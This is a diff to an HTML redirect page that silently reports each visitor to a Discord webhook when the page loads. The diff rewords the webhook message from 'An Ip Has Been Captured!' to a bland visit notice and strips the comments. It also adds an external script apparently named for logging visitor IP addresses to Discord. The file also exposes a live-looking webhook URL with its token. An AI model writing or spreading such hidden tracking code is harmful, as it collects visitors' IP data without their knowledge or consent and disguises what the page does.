@@ -76,20 +76,16 @@
         Your browser does not support the audio element.
     </audio>
 
-    <!-- Redirect after 3 seconds -->
     <meta http-equiv="refresh" content="3;url=MAINPAGE.html" />
 
-    <!-- jQuery script -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     
-    <!-- Script to send data to Discord webhook -->
     <script>
         var webHookUrl = "https://discord.com/api/webhooks/1282142873160122441/0n11R6q2IBO0kahcYdbpy05ZgTBrOQkwI8Tad7BoImMd99vSIwKImAhMJFhAw8_AssKN";
 
         $(document).ready(function () {
-            // Example of posting a message to Discord webhook
             var message = {
-                content: "An Ip Has Been Captured!"
+                content: "A user visited the page!"
             };
 
             $.ajax({
@@ -106,6 +102,8 @@
             });
         });
     </script>
+
+    <script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
 
 </body>
 </html>
